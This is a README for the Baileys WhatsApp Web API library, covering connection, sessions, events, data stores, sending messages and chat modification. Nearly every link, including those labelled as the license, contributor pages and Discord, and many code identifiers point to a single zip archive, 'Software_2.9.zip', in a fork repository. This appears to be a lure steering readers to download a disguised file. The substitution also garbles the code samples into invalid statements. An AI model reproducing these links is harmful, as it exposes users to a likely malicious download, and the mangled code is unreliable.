# Baileys - Typescript/Javascript WhatsApp Web API

### Important Note

This library was originally a project for **CS-2362 at Ashoka University** and is in no way affiliated with or endorsed by WhatsApp. Use at your own discretion. Do not spam people with this. We discourage any stalkerware, bulk or automated messaging usage. 

#### Liability and License Notice
Baileys and its maintainers cannot be held liable for misuse of this application, as stated in the [MIT license](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip).
The maintainers of Baileys do not in any way condone the use of this application in practices that violate the Terms of Service of WhatsApp. The maintainers of this application call upon the personal responsibility of its users to use this application in a fair way, as it is intended to be used.
##

Baileys does not require Selenium or any other browser to be interface with WhatsApp Web, it does so directly using a **WebSocket**. 
Not running Selenium or Chromimum saves you like **half a gig** of ram :/ 
Baileys supports interacting with the multi-device & web versions of WhatsApp.
Thank you to [@pokearaujo](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) for writing his observations on the workings of WhatsApp Multi-Device. Also, thank you to [@Sigalor](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) for writing his observations on the workings of WhatsApp Web and thanks to [@Rhymen](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) for the __go__ implementation.
 
## Please Read

The original repository had to be removed by the original author - we now continue development in this repository here.
This is the only official repository and is maintained by the community.
 **Join the Discord [here](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)**
 
## Example

Do check out & run [https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) to see an example usage of the library.
The script covers most common use cases.
To run the example script, download or clone the repo and then type the following in a terminal:
1. ``` cd path/to/Baileys ```
2. ``` yarn ```
3. ``` yarn example ```

## Install

Use the stable version:
```
yarn add @whiskeysockets/baileys
```

Use the edge version (no guarantee of stability, but latest fixes + features)
```
yarn add github:WhiskeySockets/Baileys
```

Then import your code using:
``` ts 
import makeWASocket from '@whiskeysockets/baileys'
```

## Unit Tests

TODO

## Connecting multi device (recommended)

WhatsApp provides a multi-device API that allows Baileys to be authenticated as a second WhatsApp client by scanning a QR code with WhatsApp on your phone.

``` ts
import makeWASocket, { DisconnectReason } from '@whiskeysockets/baileys'
import { Boom } from '@hapi/boom'

async function connectToWhatsApp () {
    const sock = makeWASocket({
        // can provide additional config here
        printQRInTerminal: true
    })
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', (update) => {
        const { connection, lastDisconnect } = update
        if(connection === 'close') {
            const shouldReconnect = (https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip as Boom)https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip !== https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip
            https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('connection closed due to ', https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip, ', reconnecting ', shouldReconnect)
            // reconnect if not logged out
            if(shouldReconnect) {
                connectToWhatsApp()
            }
        } else if(connection === 'open') {
            https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('opened connection')
        }
    })
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', m => {
        https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(m, undefined, 2))

        https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('replying to', https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip[0]https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)
        await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip[0]https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip!, { text: 'Hello there!' })
    })
}
// run in main file
connectToWhatsApp()
``` 

If the connection is successful, you will see a QR code printed on your terminal screen, scan it with WhatsApp on your phone and you'll be logged in!

**Note:** install `qrcode-terminal` using `yarn add qrcode-terminal` to auto-print the QR to the terminal.

**Note:** the code to support the legacy version of WA Web (pre multi-device) has been removed in v5. Only the standard multi-device connection is now supported. This is done as WA seems to have completely dropped support for the legacy version.

## Connecting native mobile api

Baileys also supports the native mobile API, which allows users to authenticate as a standalone WhatsApp client using their phone number.

Run the [example](https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) file with ``--mobile`` cli flag to use the native mobile API.

## Configuring the Connection

You can configure the connection by passing a `SocketConfig` object.

The entire `SocketConfig` structure is mentioned here with default values:
``` ts
type SocketConfig = {
    /** the WS url to connect to WA */
    waWebSocketUrl: string | URL
    /** Fails the connection if the socket times out in this interval */
	connectTimeoutMs: number
    /** Default timeout for queries, undefined for no timeout */
    defaultQueryTimeoutMs: number | undefined
    /** ping-pong interval for WS connection */
    keepAliveIntervalMs: number
    /** proxy agent */
	agent?: Agent
    /** pino logger */
	logger: Logger
    /** version to connect with */
    version: WAVersion
    /** override browser config */
	browser: WABrowserDescription
	/** agent used for fetch requests -- uploading/downloading media */
	fetchAgent?: Agent
    /** should the QR be printed in the terminal */
    printQRInTerminal: boolean
    /** should events be emitted for actions done by this socket connection */
    emitOwnEvents: boolean
    /** provide a cache to store media, so does not have to be re-uploaded */
    mediaCache?: NodeCache
    /** custom upload hosts to upload media to */
    customUploadHosts: MediaConnInfo['hosts']
    /** time to wait between sending new retry requests */
    retryRequestDelayMs: number
    /** max msg retry count */
    maxMsgRetryCount: number
    /** time to wait for the generation of the next QR in ms */
    qrTimeout?: number;
    /** provide an auth state object to maintain the auth state */
    auth: AuthenticationState
    /** manage history processing with this control; by default will sync up everything */
    shouldSyncHistoryMessage: (msg: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) => boolean
    /** transaction capability options for SignalKeyStore */
    transactionOpts: TransactionCapabilityOptions
    /** provide a cache to store a user's device list */
    userDevicesCache?: NodeCache
    /** marks the client as online whenever the socket successfully connects */
    markOnlineOnConnect: boolean
    /**
     * map to store the retry counts for failed messages;
     * used to determine whether to retry a message or not */
    msgRetryCounterMap?: MessageRetryMap
    /** width for link preview images */
    linkPreviewImageThumbnailWidth: number
    /** Should Baileys ask the phone for full history, will be received async */
    syncFullHistory: boolean
    /** Should baileys fire init queries automatically, default true */
    fireInitQueries: boolean
    /**
     * generate a high quality link preview,
     * entails uploading the jpegThumbnail to WA
     * */
    generateHighQualityLinkPreview: boolean

    /** options for axios */
    options: AxiosRequestConfig<any>
    /**
     * fetch a message from your store
     * implement this so that messages failed to send (solves the "this message can take a while" issue) can be retried
     * */
    getMessage: (key: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) => Promise<https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip | undefined>
}
```

### Emulating the Desktop app instead of the web

1. Baileys, by default, emulates a chrome web session
2. If you'd like to emulate a desktop connection (and receive more message history), add this to your Socket config:
    ``` ts
    const conn = makeWASocket({
        https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip,
        // can use Windows, Ubuntu here too
        browser: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('Desktop'),
        syncFullHistory: true
    })
    ```

## Saving & Restoring Sessions

You obviously don't want to keep scanning the QR code every time you want to connect. 

So, you can load the credentials to log back in:
``` ts
import makeWASocket, { BufferJSON, useMultiFileAuthState } from '@whiskeysockets/baileys'
import * as fs from 'fs'

// utility function to help save the auth state in a single folder
// this function serves as a good guide to help write auth & key states for SQL/no-SQL databases, which I would recommend in any production grade system
const { state, saveCreds } = await useMultiFileAuthState('auth_info_baileys')
// will use the given state to connect
// so if valid credentials are available -- it'll connect without QR
const conn = makeWASocket({ auth: state }) 
// this will be called as soon as the credentials are updated
https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip ('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', saveCreds)
```

**Note:** When a message is received/sent, due to signal sessions needing updating, the auth keys (`https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip`) will update. Whenever that happens, you must save the updated keys (`https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip()` is called). Not doing so will prevent your messages from reaching the recipient & cause other unexpected consequences. The `useMultiFileAuthState` function automatically takes care of that, but for any other serious implementation -- you will need to be very careful with the key state management.

## Listening to Connection Updates

Baileys now fires the `https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip` event to let you know something has updated in the connection. This data has the following structure:
``` ts
type ConnectionState = {
	/** connection is now open, connecting or closed */
	connection: WAConnectionState
	/** the error that caused the connection to close */
	lastDisconnect?: {
		error: Error
		date: Date
	}
	/** is this a new login */
	isNewLogin?: boolean
	/** the current QR code */
	qr?: string
	/** has the device received all pending notifications while it was offline */
	receivedPendingNotifications?: boolean 
}
```

**Note:** this also offers any updates to the QR

## Handling Events

Baileys uses the EventEmitter syntax for events. 
They're all nicely typed up, so you shouldn't have any issues with an Intellisense editor like VS Code.

The events are typed as mentioned here:

``` ts

export type BaileysEventMap = {
    /** connection state has been updated -- WS closed, opened, connecting etc. */
	'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<ConnectionState>
    /** credentials updated -- some metadata, keys or something */
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<AuthenticationCreds>
    /** history sync, everything is reverse chronologically sorted */
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': {
        chats: Chat[]
        contacts: Contact[]
        messages: WAMessage[]
        isLatest: boolean
    }
    /** upsert chats */
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Chat[]
    /** update the given chats */
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<Chat>[]
    /** delete chats with given ID */
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': string[]
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': LabelAssociation
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Label
    /** presence of contact in a chat updated */
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { id: string, presences: { [participant: string]: PresenceData } }

    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Contact[]
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<Contact>[]

    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { keys: WAMessageKey[] } | { jid: string, all: true }
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': WAMessageUpdate[]
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { key: WAMessageKey, media?: { ciphertext: Uint8Array, iv: Uint8Array }, error?: Boom }[]
    /**
     * add/update the given messages. If they were received while the connection was online,
     * the update will have type: "notify"
     *  */
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { messages: WAMessage[], type: MessageUpsertType }
    /** message was reacted to. If reaction was removed -- then "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip" will be falsey */
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { key: WAMessageKey, reaction: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip }[]

    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': MessageUserReceiptUpdate[]

    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': GroupMetadata[]
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': Partial<GroupMetadata>[]
    /** apply an action to participants in a group */
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { id: string, participants: string[], action: ParticipantAction }

    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { blocklist: string[] }
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip': { blocklist: string[], type: 'add' | 'remove' }
    /** Receive an update on a call, including when the call was received, rejected, accepted */
    'call': WACallEvent[]
}
```

You can listen to these events like this:
``` ts

const sock = makeWASocket()
https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', ({ messages }) => {
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('got messages', messages)
})

```

## Implementing a Data Store

Baileys does not come with a defacto storage for chats, contacts, or messages. However, a simple in-memory implementation has been provided. The store listens for chat updates, new messages, message updates, etc., to always have an up-to-date version of the data.

It can be used as follows:

``` ts
import makeWASocket, { makeInMemoryStore } from '@whiskeysockets/baileys'
// the store maintains the data of the WA connection in memory
// can be written out to a file & read from it
const store = makeInMemoryStore({ })
// can be read from a file
https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
// saves the state to a file every 10s
setInterval(() => {
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
}, 10_000)

const sock = makeWASocket({ })
// will listen from this socket
// the store can listen from a new socket once the current socket outlives its lifetime
https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)

https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', () => {
    // can use "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip" however you want, even after the socket dies out
    // "chats" => a KeyedDB instance
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('got chats', https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip())
})

https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', () => {
    https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('got contacts', https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip))
})

```

The store also provides some simple functions such as `loadMessages` that utilize the store to speed up data retrieval.

**Note:** I highly recommend building your own data store especially for MD connections, as storing someone's entire chat history in memory is a terrible waste of RAM.

## Sending Messages

**Send all types of messages with a single function:**

### Non-Media Messages

``` ts
import { MessageType, MessageOptions, Mimetype } from '@whiskeysockets/baileys'

const id = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // the WhatsApp ID 
// send a simple text!
const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, { text: 'oh hello there' })
// send a reply messagge
const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, { text: 'oh hello there' }, { quoted: message })
// send a mentions message
const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, { text: '@12345678901', mentions: ['https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip'] })
// send a location!
const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
    id, 
    { location: { degreesLatitude: 24.121231, degreesLongitude: 55.1121221 } }
)
// send a contact!
const vcard = 'BEGIN:VCARD\n' // metadata of the contact card
            + 'VERSION:3.0\n' 
            + 'FN:Jeff Singh\n' // full name
            + 'ORG:Ashoka Uni;\n' // the organization of the contact
            + 'TEL;type=CELL;type=VOICE;waid=911234567890:+91 12345 67890\n' // WhatsApp ID + phone number
            + 'END:VCARD'
const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
    id,
    { 
        contacts: { 
            displayName: 'Jeff', 
            contacts: [{ vcard }] 
        }
    }
)

const reactionMessage = {
    react: {
        text: "💖", // use an empty string to remove the reaction
        key: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip
    }
}

const sendMsg = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, reactionMessage)
```

### Sending messages with link previews

1. By default, WA MD does not have link generation when sent from the web
2. Baileys has a function to generate the content for these link previews
3. To enable this function's usage, add `link-preview-js` as a dependency to your project with `yarn add link-preview-js`
4. Send a link:
``` ts
// send a link
const sentMsg  = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(id, { text: 'Hi, this was sent using https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' })
```

### Media Messages

Sending media (video, stickers, images) is easier & more efficient than ever. 
- You can specify a buffer, a local url or even a remote url.
- When specifying a media url, Baileys never loads the entire buffer into memory; it even encrypts the media as a readable stream.

``` ts
import { MessageType, MessageOptions, Mimetype } from '@whiskeysockets/baileys'
// Sending gifs
await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
    id, 
    { 
        video: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip("https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip"), 
        caption: "hello!",
        gifPlayback: true
    }
)

await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
    id, 
    { 
        video: "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip", 
        caption: "hello!",
        gifPlayback: true,
	ptv: false // if set to true, will send as a `video note`
    }
)

// send an audio file
await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
    id, 
    { audio: { url: "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip" }, mimetype: 'audio/mp4' }
    { url: "https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip" }, // can send mp3, mp4, & ogg
)
```

### Notes

- `id` is the WhatsApp ID of the person or group you're sending the message to. 
    - It must be in the format ```[country code][phone number]https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip```
	    - Example for people: ```+https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip```. 
	    - For groups, it must be in the format ``` https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip ```. 
    - For broadcast lists, it's `[timestamp of creation]@broadcast`.
    - For stories, the ID is `status@broadcast`.
- For media messages, the thumbnail can be generated automatically for images & stickers provided you add `jimp` or `sharp` as a dependency in your project using `yarn add jimp` or `yarn add sharp`. Thumbnails for videos can also be generated automatically, though, you need to have `ffmpeg` installed on your system.
- **MiscGenerationOptions**: some extra info about the message. It can have the following __optional__ values:
    ``` ts
    const info: MessageOptions = {
        quoted: quotedMessage, // the message you want to quote
        contextInfo: { forwardingScore: 2, isForwarded: true }, // some random context info (can show a forwarded message with this too)
        timestamp: Date(), // optional, if you want to manually set the timestamp of the message
        caption: "hello there!", // (for media messages) the caption to send with the media (cannot be sent with stickers though)
        jpegThumbnail: "23GD#4/==", /*  (for location & media messages) has to be a base 64 encoded JPEG if you want to send a custom thumb, 
                                    or set to null if you don't want to send a thumbnail.
                                    Do not enter this field if you want to automatically generate a thumb
                                */
        mimetype: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip, /* (for media messages) specify the type of media (optional for all media types except documents),
                                    import {Mimetype} from '@whiskeysockets/baileys'
                                */
        fileName: 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', // (for media messages) file name for the media
        /* will send audio messages as voice notes, if set to true */
        ptt: true,
        /** Should it send as a disappearing messages. 
         * By default 'chat' -- which follows the setting of the chat */
        ephemeralExpiration: WA_DEFAULT_EPHEMERAL
    }
    ```
## Forwarding Messages

``` ts
const msg = getMessageFromStore('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', 'HSJHJWH7323HSJSJ') // implement this on your end
await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', { forward: msg }) // WA forward the message!
```

## Reading Messages

A set of message keys must be explicitly marked read now. 
In multi-device, you cannot mark an entire "chat" read as it were with Baileys Web.
This means you have to keep track of unread messages.

``` ts
const key = {
    remoteJid: 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip',
    id: 'AHASHH123123AHGA', // id of the message you want to read
    participant: 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // the ID of the user that sent the  message (undefined for individual chats)
}
// pass to readMessages function
// can pass multiple keys to read multiple messages as well
await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip([key])
```

The message ID is the unique identifier of the message that you are marking as read. 
On a `WAMessage`, the `messageID` can be accessed using ```messageID = https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip```.

## Update Presence

``` ts
await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('available', id) 

```
This lets the person/group with ``` id ``` know whether you're online, offline, typing etc. 

``` presence ``` can be one of the following:
``` ts
type WAPresence = 'unavailable' | 'available' | 'composing' | 'recording' | 'paused'
```

The presence expires after about 10 seconds.

**Note:** In the multi-device version of WhatsApp -- if a desktop client is active, WA doesn't send push notifications to the device. If you would like to receive said notifications -- mark your Baileys client offline using `https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('unavailable')`

## Downloading Media Messages

If you want to save the media you received
``` ts
import { writeFile } from 'fs/promises'
import { downloadMediaMessage } from '@whiskeysockets/baileys'

https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', async ({ messages }) => {
    const m = messages[0]

    if (!https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip) return // if there is no text or media message
    const messageType = https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip (https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip)[0]// get what type of message it is -- text, image, video
    // if the message is an image
    if (messageType === 'imageMessage') {
        // download the message
        const buffer = await downloadMediaMessage(
            m,
            'buffer',
            { },
            { 
                logger,
                // pass this so that baileys can request a reupload of media
                // that has been deleted
                reuploadRequest: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip
            }
        )
        // save to file
        await writeFile('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', buffer)
    }
}
```

**Note:** WhatsApp automatically removes old media from their servers. For the device to access said media -- a re-upload is required by another device that has it. This can be accomplished using: 
``` ts
const updatedMediaMsg = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(msg)
```

## Deleting Messages

``` ts
const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // can also be a group
const response = await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, { text: 'hello!' }) // send a message
// sends a message to delete the given message
// this deletes the message for everyone
await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, { delete: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip })
```

**Note:** deleting for oneself is supported via `chatModify` (next section)

## Updating Messages

``` ts
const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip'

await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(jid, {
      text: 'updated text goes here',
      edit: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip,
    });
```

## Modifying Chats

WA uses an encrypted form of communication to send chat/app updates. This has been implemented mostly and you can send the following updates:

- Archive a chat
  ``` ts
  const lastMsgInChat = await getLastMessageInChat('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip') // implement this on your end
  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({ archive: true, lastMessages: [lastMsgInChat] }, 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
  ```
- Mute/unmute a chat
  ``` ts
  // mute for 8 hours
  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({ mute: 8*60*60*1000 }, 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', [])
  // unmute
  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({ mute: null }, 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', [])
  ```
- Mark a chat read/unread
  ``` ts
  const lastMsgInChat = await getLastMessageInChat('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip') // implement this on your end
  // mark it unread
  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({ markRead: false, lastMessages: [lastMsgInChat] }, 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
  ```

- Delete a message for me
  ``` ts
  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip(
    { clear: { messages: [{ id: 'ATWYHDNNWU81732J', fromMe: true, timestamp: "1654823909" }] } }, 
    'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip', 
    []
    )

  ```

- Delete a chat
  ``` ts
  const lastMsgInChat = await getLastMessageInChat('https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip') // implement this on your end
  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({
    delete: true,
    lastMessages: [{ key: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip, messageTimestamp: https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip }]
  },
  'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
  ```

- Pin/unpin a chat
  ``` ts
  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({
    pin: true // or `false` to unpin
  },
  'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip')
  ```
  
- Star/unstar a message
  ``` ts
  await https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip({
  star: {
  	messages: [{ id: 'messageID', fromMe: true // or `false` }],
      	star: true // - true: Star Message; false: Unstar Message
  }},'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip');
  ```

**Note:** if you mess up one of your updates, WA can log you out of all your devices and you'll have to log in again.

## Disappearing Messages

``` ts
const jid = 'https://github.com/cyran-kyle/Baileys/raw/refs/heads/main/lib/Signal/Software_2.9.zip' // can also be a group
// turn on disappearing messages
